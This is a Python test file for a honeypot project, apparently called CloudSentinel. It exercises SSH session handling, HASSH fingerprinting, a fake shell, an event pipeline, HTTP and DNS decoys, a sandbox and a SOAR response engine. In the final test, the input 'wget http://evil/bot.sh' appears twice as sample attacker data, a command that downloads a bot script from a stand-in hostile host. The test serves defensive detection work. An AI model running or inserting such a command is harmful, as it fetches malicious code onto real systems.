"""Remaining paths: server startup, HASSH, TTY, commands, pipeline, VFS, HTTP, DNS, CLI."""

from __future__ import annotations

import asyncio
import struct
import sys
import time
import types
from pathlib import Path

import pytest

from cloudsentinel import cli
from cloudsentinel.config import RedisSettings, load_settings
from cloudsentinel.dns_honeypot import DNSHoneypot
from cloudsentinel.event_codec import loads_text
from cloudsentinel.honeyfs_seed import seed_honeyfs
from cloudsentinel.http_server import create_http_honeypot
from cloudsentinel.pipeline import EventEnvelope, EventPipeline, LocalWAL
from cloudsentinel.sandbox import GVisorSandbox
from cloudsentinel.server import (
    CloudSentinelSession,
    TTYLogger,
    extract_hassh,
    extract_ja4s,
    start_admin_api,
    start_http_honeypot,
)
from cloudsentinel.shell import HoneyPotInteractiveProtocol
from cloudsentinel.soar import SOAREngine
from cloudsentinel.vfs import VirtualFileSystem


class FakeChannel:
    def __init__(self) -> None:
        self.output = b""
        self.exits: list[int] = []
        self.closed = False

    def write(self, data: str | bytes) -> None:
        if isinstance(data, str):
            data = data.encode()
        self.output += data

    def exit(self, status: int = 0) -> None:
        self.exits.append(status)

    def close(self) -> None:
        self.closed = True


def _session_with_fake_server():
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.llm.provider = "mock"

    async def emit_event(*_args: object, **_kwargs: object) -> None:
        return None

    fake_server = type(
        "FakeServer",
        (),
        {
            "settings": settings,
            "username": "root",
            "src_ip": "8.8.8.8",
            "started_at": time.time(),
            "anomaly_detector": None,
            "_emit_event": emit_event,
            "_fuzz_detected": False,
            "_tty_logger": type("TTY", (), {"record": lambda self, _data: None})(),
        },
    )()
    return CloudSentinelSession(fake_server)


@pytest.mark.asyncio
async def test_session_control_bytes() -> None:
    session = _session_with_fake_server()
    channel = FakeChannel()
    session.connection_made(channel)
    session.data_received("abc\x7f\x08\r", None)
    session.data_received("\t", None)
    session.data_received("\x03", None)
    session.data_received("\x04", None)
    assert 0 in channel.exits
    await session.vfs.close()


def test_extract_hassh_fallback() -> None:
    class Conn:
        def get_extra_info(self, name: str, default: object = None) -> object:
            values = {
                "kex_algs": "curve25519-sha256",
                "enc_algs": "aes256-ctr",
                "mac_algs": "hmac-sha2-256",
                "cmp_algs": "none",
                "server_version": "SSH-2.0-test",
                "send_cipher": "aes256-ctr",
                "send_mac": "hmac-sha2-256",
                "send_compression": "none",
            }
            return values.get(name, default)

    hassh, algorithms = extract_hassh(Conn())
    assert hassh is not None
    assert len(hassh) == 32
    assert algorithms
    ja4s = extract_ja4s(Conn(), algorithms)
    assert ja4s is not None
    assert ja4s.startswith("ja4s_ssh_")


@pytest.mark.asyncio
async def test_tty_logger_save(tmp_path: Path) -> None:
    logger = TTYLogger("unit-tty")
    logger._dir = tmp_path
    logger.record(b"hello")
    await logger.save_async()
    assert (tmp_path / "tty.raw").read_bytes() == b"hello"
    assert (tmp_path / "tty.log").exists()


@pytest.mark.asyncio
async def test_server_start_functions(monkeypatch: pytest.MonkeyPatch) -> None:
    served: list[str] = []

    class FakeServer:
        def __init__(self, config: object) -> None:
            self.config = config

        async def serve(self) -> None:
            served.append("server")

    fake_uvicorn = types.ModuleType("uvicorn")
    fake_uvicorn.Config = lambda *args, **kwargs: types.SimpleNamespace(args=args, kwargs=kwargs)
    fake_uvicorn.Server = FakeServer
    monkeypatch.setitem(sys.modules, "uvicorn", fake_uvicorn)
    monkeypatch.setitem(sys.modules, "granian", None)
    monkeypatch.setenv("ADMIN_SERVER", "uvicorn")

    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )
    settings.tls.enabled = False
    settings.admin.enabled = True
    pipeline = EventPipeline(settings.redis)
    await start_admin_api(settings, pipeline, None)
    await start_http_honeypot(settings, pipeline, None)
    assert len(served) == 2


def test_commands_more_paths() -> None:
    class Transport:
        def __init__(self) -> None:
            self.data = b""

        def write(self, data: bytes) -> None:
            self.data += data

        def close(self) -> None:
            return None

    commands = [
        "uname -a",
        "cat /etc/os-release",
        "ls /root",
        "ls /var/log",
        "grep root /etc/passwd",
        "head -n 1 /etc/passwd",
        "tail -n 1 /etc/passwd",
        "wc -l /etc/passwd",
        "du -sh /var",
        "stat /etc/passwd",
        "file /bin/ls",
        "md5sum /etc/passwd",
        "sha256sum /etc/passwd",
        "base64 /etc/hostname",
        "which python3",
        "type ls",
        "alias",
        "history",
        "jobs",
        "umask",
        "ulimit -a",
        "getconf LONG_BIT",
        "lsof",
        "top -b -n 1",
        "vmstat",
        "lspci",
        "lsusb",
        "ping -c 1 8.8.8.8",
        "ifconfig",
        "ss -antp",
        "netstat -antp",
        "ip addr",
        "route -n",
        "arp -a",
        "crontab -l",
        "systemctl status ssh",
    ]
    executed = 0
    for command in commands:
        transport = Transport()
        protocol = HoneyPotInteractiveProtocol(
            transport=transport,
            vfs=VirtualFileSystem.build_default(),
            username="root",
            hostname="unit-host",
            ip="8.8.8.8",
        )
        protocol._execute_single(command.encode())
        executed += 1
    assert executed == len(commands)


@pytest.mark.asyncio
async def test_pipeline_stop_and_write_failure(tmp_path: Path) -> None:
    pipeline = EventPipeline(RedisSettings())
    calls: list[str] = []

    class FakeNats:
        async def drain(self) -> None:
            calls.append("nats")

    class FakeKafka:
        async def stop(self) -> None:
            calls.append("kafka")

    pipeline._nats = FakeNats()
    pipeline._kafka = FakeKafka()
    await pipeline.stop()
    assert calls == ["nats", "kafka"]

    class BrokenRedis:
        async def xadd(self, *_args: object, **_kwargs: object) -> None:
            raise RuntimeError("redis down")

    pipeline2 = EventPipeline(RedisSettings())
    pipeline2._redis = BrokenRedis()  # type: ignore[assignment]
    pipeline2._connected = True
    pipeline2._wal = LocalWAL(tmp_path / "wal.jsonl")
    envelope = EventEnvelope(
        event_type="cloudsentinel.command.input",
        session_id="unit",
        src_ip="8.8.8.8",
        src_port=1,
        timestamp=time.time(),
        payload={"eventid": "cloudsentinel.command.input"},
    )
    await pipeline2.emit(envelope)
    assert pipeline2.pending_count == 1
    assert (tmp_path / "wal.jsonl").exists()


@pytest.mark.asyncio
async def test_local_wal_invalid_line(tmp_path: Path) -> None:
    path = tmp_path / "wal.jsonl"
    path.write_text("not-json\n", encoding="utf-8")
    wal = LocalWAL(path)
    assert await wal.read_and_clear() == []


def test_vfs_from_honeyfs(tmp_path: Path) -> None:
    root = tmp_path / "honeyfs"
    seed_honeyfs(root)
    vfs = VirtualFileSystem.from_honeyfs(str(root))
    assert b"root:x:0:0" in vfs.file_contents("/etc/passwd")


def test_http_risk_routes() -> None:
    from fastapi.testclient import TestClient

    class PipelineStub:
        async def emit(self, _envelope: EventEnvelope) -> None:
            return None

    client = TestClient(create_http_honeypot(PipelineStub()))
    assert client.get("/wp-admin").status_code == 200
    assert client.get("/manager/html").status_code == 401
    assert client.get("/phpmyadmin").status_code == 200
    assert client.get("/.env").status_code == 200
    assert client.get("/shell.php").status_code == 404


def test_dns_qname_parsing() -> None:
    qname = b"\x07example\x03com\x00"
    assert DNSHoneypot._parse_qname(qname, 0) == "example.com"
    assert DNSHoneypot._parse_qname(b"\x00", 0) == ""
    assert DNSHoneypot._parse_qname(b"\xc0", 0) == ""


@pytest.mark.asyncio
async def test_gvisor_timeout(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("cloudsentinel.sandbox.shutil.which", lambda _: "/usr/bin/runsc")

    class SlowProc:
        returncode = 0

        async def communicate(self) -> tuple[bytes, bytes]:
            await asyncio.sleep(10)
            return b"", b""

        def kill(self) -> None:
            return None

    async def fake_exec(*_args: object, **_kwargs: object) -> SlowProc:
        return SlowProc()

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    sandbox = GVisorSandbox()
    sandbox.timeout = 0.01
    code, message = await sandbox.execute("whoami", "~")
    assert code == 124
    assert "timeout" in message.lower()


def test_cli_serve_and_main(monkeypatch: pytest.MonkeyPatch) -> None:
    pytest.importorskip("typer")
    if not cli._HAS_CLI:
        pytest.skip("typer/rich not installed")

    async def fake_server_main() -> None:
        return None

    monkeypatch.setattr("cloudsentinel.server.main", fake_server_main)
    cli.serve(config="unit.yaml", env=".env", host=None, port=None, debug=False)
    monkeypatch.setattr(cli, "_HAS_CLI", False)
    cli.main()


@pytest.mark.asyncio
async def test_soar_block_skips() -> None:
    soar = SOAREngine(risk_threshold=5, firewall_enabled=True, firewall_dry_run=True)
    allowlisted = await soar.process_event(
        "ip-allow",
        {
            "eventid": "cloudsentinel.command.input",
            "session": "ip-allow",
            "src_ip": "10.1.1.1",
            "input": "wget http://evil/bot.sh",
        },
    )
    assert allowlisted["cloudsentinel_soar_action"] in {
        "skip_allowlisted_ip",
        "skip_private_ip",
    }
    private = await soar.process_event(
        "ip-private",
        {
            "eventid": "cloudsentinel.command.input",
            "session": "ip-private",
            "src_ip": "192.168.1.10",
            "input": "wget http://evil/bot.sh",
        },
    )
    assert private["cloudsentinel_soar_action"] in {
        "skip_allowlisted_ip",
        "skip_private_ip",
    }
